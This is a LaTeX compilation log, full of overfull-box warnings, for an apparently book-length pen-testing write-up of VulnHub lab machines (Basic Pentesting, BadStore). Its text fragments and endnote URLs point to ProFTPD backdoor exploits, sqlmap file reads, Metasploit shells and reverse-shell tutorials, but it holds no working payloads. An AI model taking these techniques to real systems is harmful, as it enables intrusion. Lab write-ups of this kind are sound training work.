Overfull \hbox (11.01476pt too wide) in paragraph at lines 1--1
|[]\TU/EurostileExtd(0)/m/n/12 Boot2Root and Repair: VulnHub Basic Pen-
 []


Package hyperref Warning: Difference (2) between bookmark levels is greater 
(hyperref)                than one, level fixed on input line 9.

[63

]
Overfull \hbox (94.33743pt too wide) in paragraph at lines 29--41
 [][] 
 []

[64]
Overfull \hbox (93.56787pt too wide) in paragraph at lines 88--97
 [][] 
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [65]
Overfull \hbox (33.51079pt too wide) in paragraph at lines 102--111
 [][] 
 []


Overfull \hbox (349.80096pt too wide) in paragraph at lines 124--137
 [][] 
 []


Underfull \vbox (badness 4328) has occurred while \output is active []

 [66]
[67]
Overfull \hbox (27.32544pt too wide) in paragraph at lines 179--180
\TU/InfoOTDisp(0)/m/it/10 what was in the system, where we could go, and began 
to provide trickles of implementation-
 []


Overfull \hbox (66.68567pt too wide) in paragraph at lines 192--200
 [][] 
 []


Overfull \hbox (7.52078pt too wide) in paragraph at lines 205--212
 [][] 
 []

[68]
Overfull \hbox (6.52084pt too wide) in paragraph at lines 217--218
\TU/InfoOTDisp(0)/m/it/10 scripts. While hunting around in the Apache access lo
g near \TU/CourierNew(0)/m/n/10 /var/log/apache2\TU/InfoOTDisp(0)/m/it/10 ,
 []

[69] [70]
Overfull \hbox (9.07077pt too wide) in paragraph at lines 272--282
 [][] 
 []


Overfull \hbox (287.4708pt too wide) in paragraph at lines 287--295
 [][] 
 []


Overfull \hbox (27.60097pt too wide) in paragraph at lines 308--309
[]\TU/InfoOTDisp(0)/m/it/10 To accomplish all this, we used \TU/CourierNew(0)/m
/n/10 vi \TU/InfoOTDisp(0)/m/it/10 and the \TU/CourierNew(0)/m/n/10 os-shell \T
U/InfoOTDisp(0)/m/it/10 provided by the \TU/CourierNew(0)/m/n/10 msfconsole
 []

[71]
Overfull \hbox (209.45079pt too wide) in paragraph at lines 323--333
 [][] 
 []


Overfull \hbox (258.4308pt too wide) in paragraph at lines 338--349
 [][] 
 []

[72]
Overfull \hbox (9.65384pt too wide) in paragraph at lines 362--362
\TU/InfoOTDisp(0)/m/it/10 One of the websites that mentioned it mentioned to al
so comment out a \TU/CourierNew(0)/m/n/10 mod_copy.c
 []


Overfull \hbox (188.54077pt too wide) in paragraph at lines 391--400
 [][] 
 []

[73] [74]
Overfull \hbox (226.74261pt too wide) in paragraph at lines 431--433
[]\TU/InfoOTDisp(0)/m/it/10 [2] INTERNET: \TU/CourierNew(0)/m/n/10 https://nvlp
ubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf\TU/InfoOTDisp
(0)/m/it/10 [3]
 []


Overfull \hbox (97.08095pt too wide) in paragraph at lines 434--436
[]\TU/InfoOTDisp(0)/m/it/10 [4] Pierce, Josiah. \TU/CourierNew(0)/m/n/10 https:
//www.vulnhub.com/entry/basic-pentesting-1,216/\TU/InfoOTDisp(0)/m/it/10 [5]
 []


Overfull \hbox (170.40439pt too wide) in paragraph at lines 437--439
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://www.rapid7
.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor\TU/InfoOTDisp(0)/m/it/10
 [6]
 []


Overfull \hbox (440.08833pt too wide) in paragraph at lines 440--442
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://unix.stack
exchange.com/questions/8229/what-methods-are-used-to-encrypt-passwords-in-etc-p
asswd-and-etc-shadow\TU/InfoOTDisp(0)/m/it/10 [7]
 []


Overfull \hbox (254.53806pt too wide) in paragraph at lines 443--445
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://unix.stack
exchange.com/questions/252016/difference-between-vs-vs-in-etc-shadow\TU/InfoOTD
isp(0)/m/it/10 [8]
 []


Overfull \hbox (92.4117pt too wide) in paragraph at lines 446--448
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://www.unix-n
inja.com/p/Hashcat_Line_Length_Exceptions\TU/InfoOTDisp(0)/m/it/10 [9]
 []

[75]
Overfull \hbox (15.82843pt too wide) in paragraph at lines 449--451
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://hashcat.ne
t/forum/thread-3399.html\TU/InfoOTDisp(0)/m/it/10 [10] Hash-
 []


Overfull \hbox (45.71388pt too wide) in paragraph at lines 452--454
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://hashcat.ne
t/wiki/doku.php?id=example_hashes\TU/InfoOTDisp(0)/m/it/10 [11]
 []


Overfull \hbox (131.23755pt too wide) in paragraph at lines 455--457
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 http://www.informi
t.com/articles/article.aspx?p=1161217&seqNum=11\TU/InfoOTDisp(0)/m/it/10 [12]
 []


Overfull \hbox (299.1149pt too wide) in paragraph at lines 458--460
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://www.garron
.me/en/linux/set-time-date-timezone-ntp-linux-shell-gnome-command-line.html\TU/
InfoOTDisp(0)/m/it/10 [13]
 []


Overfull \hbox (215.10123pt too wide) in paragraph at lines 461--463
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://www.thegee
kstuff.com/2012/11/linux-touch-command/?utm_source=feedburner\TU/InfoOTDisp(0)/
m/it/10 [14]
 []


Overfull \hbox (262.80267pt too wide) in paragraph at lines 464--466
\TU/InfoOTDisp(0)/m/it/10 Hudson, Andrew and Paul Hudson. INTERNET: \TU/Courier
New(0)/m/n/10 http://www.informit.com/articles/article.aspx?p=1161217&seqNum=11
\TU/InfoOTDisp(0)/m/it/10 [15]
 []


Overfull \hbox (2.07213pt too wide) in paragraph at lines 467--469
\TU/InfoOTDisp(0)/m/it/10 | Use ntp” INTERNET: \TU/CourierNew(0)/m/n/10 https:/
/www.garron.me/en/linux/\TU/InfoOTDisp(0)/m/it/10 [16] 2012. Set-
 []


Overfull \hbox (266.72456pt too wide) in paragraph at lines 473--475
\TU/InfoOTDisp(0)/m/it/10 Timestamp).” INTERNET: \TU/CourierNew(0)/m/n/10 https
://www.thegeekstuff.com/2012/11/linux-touch-command/?utm_source=feedburner\TU/I
nfoOTDisp(0)/m/it/10 [17]
 []

[76]
Overfull \hbox (287.53294pt too wide) in paragraph at lines 476--478
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://askubuntu.
com/questions/920598/disable-network-time-synchronization-in-ubuntu-16-04\TU/In
foOTDisp(0)/m/it/10 [18]
 []


Overfull \hbox (239.32513pt too wide) in paragraph at lines 479--481
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://askubuntu.
com/questions/24006/how-do-i-reset-a-lost-administrative-password\TU/InfoOTDisp
(0)/m/it/10 [19]
 []


Overfull \hbox (19.049pt too wide) in paragraph at lines 482--484
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 http://www.proftpd
.org/docs/howto/Upgrade.html\TU/InfoOTDisp(0)/m/it/10 [20]
 []


Overfull \hbox (6.33688pt too wide) in paragraph at lines 485--487
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://www.virtua
lmin.com/node/43086\TU/InfoOTDisp(0)/m/it/10 [21] Forum post
 []


Overfull \hbox (36.63193pt too wide) in paragraph at lines 488--490
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 http://www.proftpd
.org/docs/contrib/mod_copy.html\TU/InfoOTDisp(0)/m/it/10 [22]
 []


Overfull \hbox (168.50342pt too wide) in paragraph at lines 491--493
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://www.rapid7
.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec\TU/InfoOTDisp(0)/m/it/10 
[23]
 []


Overfull \hbox (156.60146pt too wide) in paragraph at lines 494--496
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://gist.githu
b.com/stefansundin/0fd6e9de172041817d0b8a75f1ede677\TU/InfoOTDisp(0)/m/it/10 [2
4]
 []


Overfull \hbox (132.73755pt too wide) in paragraph at lines 497--499
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://gist.githu
b.com/techgaun/df66d37379df37838482c4c3470bc48e\TU/InfoOTDisp(0)/m/it/10 [25]
 []

[77]
Overfull \hbox (322.73662pt too wide) in paragraph at lines 500--502
\TU/InfoOTDisp(0)/m/it/10 ”Ubuntu Linux: Start / Stop / Restart / Reload OpenSS
H Server” INTERNET: \TU/CourierNew(0)/m/n/10 https://www.cyberciti.biz/faq/howt
o-start-stop-ssh-server/\TU/InfoOTDisp(0)/m/it/10 [26]
 []


Overfull \hbox (318.36783pt too wide) in paragraph at lines 503--505
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://esc.sh/blo
g/proftp-vulnerability-could-allow-an-attacker-to-gain-a-shell-in-your-server/\
TU/InfoOTDisp(0)/m/it/10 [27]
 []


Overfull \hbox (267.09187pt too wide) in paragraph at lines 506--508
\TU/InfoOTDisp(0)/m/it/10 ”Linux: List / Display All Cron Jobs” INTERNET: \TU/C
ourierNew(0)/m/n/10 https://www.cyberciti.biz/faq/linux-show-what-cron-jobs-are
-setup/\TU/InfoOTDisp(0)/m/it/10 [28]
 []


Overfull \hbox (570.98885pt too wide) in paragraph at lines 509--511
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://null-byte.
wonderhowto.com/how-to/create-reverse-shell-remotely-execute-root-commands-over
-any-open-port-using-netcat-bash-0132658/\TU/InfoOTDisp(0)/m/it/10 [29]
 []


Overfull \hbox (9.75313pt too wide) in paragraph at lines 512--514
\TU/CourierNew(0)/m/n/10 https://zhaoyu.li/post/auto-reverse-ssh/\TU/InfoOTDisp
(0)/m/it/10 [30] Example of a brief
 []


Overfull \hbox (338.44148pt too wide) in paragraph at lines 515--517
\TU/InfoOTDisp(0)/m/it/10 Gargiullo, Michael. ”Fun With SSH Reverse Shells” INT
ERNET: \TU/CourierNew(0)/m/n/10 https://www.pivotpointsecurity.com/blog/fun-wit
h-ssh-reverse-shells/\TU/InfoOTDisp(0)/m/it/10 [31]
 []


Overfull \hbox (345.04189pt too wide) in paragraph at lines 518--520
\TU/InfoOTDisp(0)/m/it/10 ”Linux Start Restart and Stop The Cron or Crond Servi
ce” INTERNET: \TU/CourierNew(0)/m/n/10 https://www.cyberciti.biz/faq/howto-linu
x-unix-start-restart-cron/\TU/InfoOTDisp(0)/m/it/10 [32]
 []


Overfull \hbox (120.4456pt too wide) in paragraph at lines 521--523
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://askubuntu.
com/questions/2368/how-do-i-set-up-a-cron-job\TU/InfoOTDisp(0)/m/it/10 [33]
 []


Overfull \hbox (36.73193pt too wide) in paragraph at lines 524--526
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://ubuntuforu
ms.org/showthread.php?t=2380028\TU/InfoOTDisp(0)/m/it/10 [34]
 []

[78]
Overfull \hbox (228.65318pt too wide) in paragraph at lines 527--529
\TU/InfoOTDisp(0)/m/it/10 INTERNET: \TU/CourierNew(0)/m/n/10 https://stackoverf
low.com/questions/36453976/upgrade-openssh-7-2p-in-ubuntu-14-04\TU/InfoOTDisp(0
)/m/it/10 [35]
 []

[79]) (./chapters/bad_store.tex [80]
Chapter 5.

Overfull \hbox (76.97743pt too wide) in paragraph at lines 21--33
 [][] 
 []


Package hyperref Warning: Difference (2) between bookmark levels is greater 
(hyperref)                than one, level fixed on input line 36.

[81

]
Overfull \hbox (9.6308pt too wide) in paragraph at lines 56--62
 [][] 
 []

[82] [83] [84]
Overfull \hbox (0.14854pt too wide) in paragraph at lines 167--168
[]\TU/InfoOTDisp(0)/m/it/10 The supplier directory was referred to in robots.tx
t. Looking up robots.txt showed
 []


Overfull \hbox (12.44481pt too wide) in paragraph at lines 169--170
[]\TU/InfoOTDisp(0)/m/it/10 The \TU/CourierNew(0)/m/n/10 cgi-bin/ \TU/InfoOTDis
p(0)/m/it/10 showed a couple of things. First, laying around was a \TU/CourierN
ew(0)/m/n/10 test.cgi
 []

[85]
Overfull \hbox (37.66492pt too wide) in paragraph at lines 177--180
[]\TU/InfoOTDisp(0)/m/it/10 The output showed a pattern like: \TU/CourierNew(0)
/m/n/10 <100X>:<USER>/<PASSWORD>/<?OPTIONAL
 []


Overfull \hbox (29.4908pt too wide) in paragraph at lines 206--217
 [][] 
 []

[86]
Overfull \hbox (91.05077pt too wide) in paragraph at lines 222--233
 [][] 
 []


Underfull \vbox (badness 1231) has occurred while \output is active []

 [87]
[88]
Overfull \hbox (43.67078pt too wide) in paragraph at lines 287--297
 [][] 
 []


Overfull \hbox (285.07082pt too wide) in paragraph at lines 302--312
 [][] 
 []

[89]
Overfull \hbox (59.31998pt too wide) in paragraph at lines 327--327
\TU/InfoOTDisp(0)/m/it/10 when we try to give similar commands, we can see this
 warning about \TU/CourierNew(0)/m/n/10 --skip-grant-tables\TU/InfoOTDisp(0)/m/
it/10 .
 []

[90] [91]
Overfull \hbox (1.29662pt too wide) in paragraph at lines 352--353
\TU/InfoOTDisp(0)/m/it/10 An example of reading a file from the target box usin
g \TU/CourierNew(0)/m/n/10 sqlmap \TU/InfoOTDisp(0)/m/it/10 and a direct databa
se
 []


Overfull \hbox (15.45404pt too wide) in paragraph at lines 364--365
[]\TU/InfoOTDisp(0)/m/it/10 This kind of POST file read technique can be combin
e with the other \TU/CourierNew(0)/m/n/10 --file-dest
 []


Overfull \hbox (369.62077pt too wide) in paragraph at lines 370--381
 [][] 
 []


Overfull \hbox (47.63077pt too wide) in paragraph at lines 386--395
 [][] 
 []

[92]
Overfull \hbox (10.27422pt too wide) in paragraph at lines 415--416
\TU/InfoOTDisp(0)/m/it/10 MySQL database didn’t work well because of the lack o
f an \TU/CourierNew(0)/m/n/10 INFORMATION_SCHEMA
 []


Overfull \hbox (530.6108pt too wide) in paragraph at lines 423--432
 [][] 
 []


Underfull \vbox (badness 2521) has occurred while \output is active []

 [93]
Overfull \hbox (30.83078pt too wide) in paragraph at lines 437--446
 [][] 
 []

[94]
Overfull \hbox (235.09082pt too wide) in paragraph at lines 470--480
 [][] 
 []


Overfull \hbox (149.34077pt too wide) in paragraph at lines 485--493
 [][] 
 []


Overfull \hbox (0.85693pt too wide) in paragraph at lines 499--500
\TU/InfoOTDisp(0)/m/it/10 Downloading the \TU/CourierNew(0)/m/n/10 badstore.cgi
 \TU/InfoOTDisp(0)/m/it/10 file itself yielded a wealth of information. Pretty
 []

[95]
Overfull \hbox (173.46124pt too wide) in paragraph at lines 518--519
[]\TU/InfoOTDisp(0)/m/it/10 [12] _____. ”Bad Store 1.2.3,” Vulnhub. INTERNET: \
TU/CourierNew(0)/m/n/10 https://www.vulnhub.com/entry/badstore-123,41/\TU/InfoO
TDisp(0)/m/it/10 [13] 
 []

[96]
Overfull \hbox (313.53035pt too wide) in paragraph at lines 529--531
\TU/CourierNew(0)/m/n/10 https://community.rsa.com/community/products/netwitnes
s/blog/2017/04/10/from-sql-injection-to-webshell\TU/InfoOTDisp(0)/m/it/10 [22] 

 []


Overfull \hbox (270.76901pt too wide) in paragraph at lines 534--536
[]\TU/InfoOTDisp(0)/m/it/10 [23] _____. INTERNET: \TU/CourierNew(0)/m/n/10 http
s://w00troot.blogspot.com/2017/05/getting-reverse-shell-from-web-shell.html\TU/
InfoOTDisp(0)/m/it/10 [24]
 []


Overfull \hbox (313.31584pt too wide) in paragraph at lines 537--539
[]\TU/InfoOTDisp(0)/m/it/10 [25] _____. INTERNET: \TU/CourierNew(0)/m/n/10 http
s://www.darkmoreops.com/2014/08/28/use-sqlmap-sql-injection-hack-website-databa
se/\TU/InfoOTDisp(0)/m/it/10 [26]
 []


Overfull \hbox (150.90948pt too wide) in paragraph at lines 540--542
[]\TU/InfoOTDisp(0)/m/it/10 [27] _____. INTERNET: \TU/CourierNew(0)/m/n/10 http
s://sneakerhax.com/tool-tips-sqlmap-with-post-requests/\TU/InfoOTDisp(0)/m/it/1
0 [28]
 []


Overfull \hbox (110.2121pt too wide) in paragraph at lines 543--545
[]\TU/InfoOTDisp(0)/m/it/10 [29] INTERNET: \TU/CourierNew(0)/m/n/10 https://dev
.mysql.com/doc/refman/5.5/en/create-user.html\TU/InfoOTDisp(0)/m/it/10 [30]
 []


Overfull \hbox (71.85623pt too wide) in paragraph at lines 546--548
[]\TU/InfoOTDisp(0)/m/it/10 [31] INTERNET: \TU/CourierNew(0)/m/n/10 https://dev
.mysql.com/doc/refman/5.5/en/grant.html\TU/InfoOTDisp(0)/m/it/10 [32]
 []


Overfull \hbox (283.50043pt too wide) in paragraph at lines 549--551
[]\TU/InfoOTDisp(0)/m/it/10 [33] INTERNET: \TU/CourierNew(0)/m/n/10 https://sta
ckoverflow.com/questions/1708409/how-to-start-mysql-with-skip-grant-tables\TU/I
nfoOTDisp(0)/m/it/10 [34]
 []


Overfull \hbox (475.82167pt too wide) in paragraph at lines 552--554
[]\TU/InfoOTDisp(0)/m/it/10 [35] INTERNET: \TU/CourierNew(0)/m/n/10 https://sup
eruser.com/questions/1127299/how-to-restart-mysql-with-skip-grant-tables-if-you
-cant-use-the-root-password\TU/InfoOTDisp(0)/m/it/10 [36]
 []


Overfull \hbox (19.41745pt too wide) in paragraph at lines 555--557
[]\TU/InfoOTDisp(0)/m/it/10 [37] INTERNET: \TU/CourierNew(0)/m/n/10 http://secl
ists.org/metasploit/2012/q3/40\TU/InfoOTDisp(0)/m/it/10 [38]
 []


Underfull \vbox (badness 10000) has occurred while \output is active []

 [97]
Overfull \hbox (2.04453pt too wide) in paragraph at lines 558--560
[]\TU/InfoOTDisp(0)/m/it/10 [39] INTERNET: \TU/CourierNew(0)/m/n/10 http://www.
guninski.com/modproxy1.html\TU/InfoOTDisp(0)/m/it/10 [40]
 []


Overfull \hbox (203.97772pt too wide) in paragraph at lines 561--563
[]\TU/InfoOTDisp(0)/m/it/10 [41] INTERNET: \TU/CourierNew(0)/m/n/10 https://hac
k2rule.wordpress.com/2017/02/25/sql-injection-to-meterpreter/\TU/InfoOTDisp(0)/
m/it/10 [42]
 []


Overfull \hbox (73.46623pt too wide) in paragraph at lines 564--566
[]\TU/InfoOTDisp(0)/m/it/10 [43] INTERNET: \TU/CourierNew(0)/m/n/10 https://git
hub.com/sqlmapproject/sqlmap/wiki/Usage\TU/InfoOTDisp(0)/m/it/10 [44]
 []

! Missing $ inserted.
<inserted text> 
                $
l.567 ...www.tutorialspoint.com/perl/perl_cgi.htm}
                                                  \endnote{\url{https://www....

? 
! Emergency stop.
<inserted text> 
                $
l.567 ...www.tutorialspoint.com/perl/perl_cgi.htm}
                                                  \endnote{\url{https://www....
End of file on the terminal!

 
Here is how much of TeX's memory you used:
 25574 strings out of 475846
 469059 string characters out of 5781395
 2075879 words of memory out of 5000000
 46269 multiletter control sequences out of 15000+600000
 562613 words of font info for 91 fonts, out of 8000000 for 9000
 1348 hyphenation exceptions out of 8191
 91i,13n,117p,5814b,1729s stack positions out of 10000i,1000n,20000p,200000b,200000s
Output written on ut.pdf (111 pages).
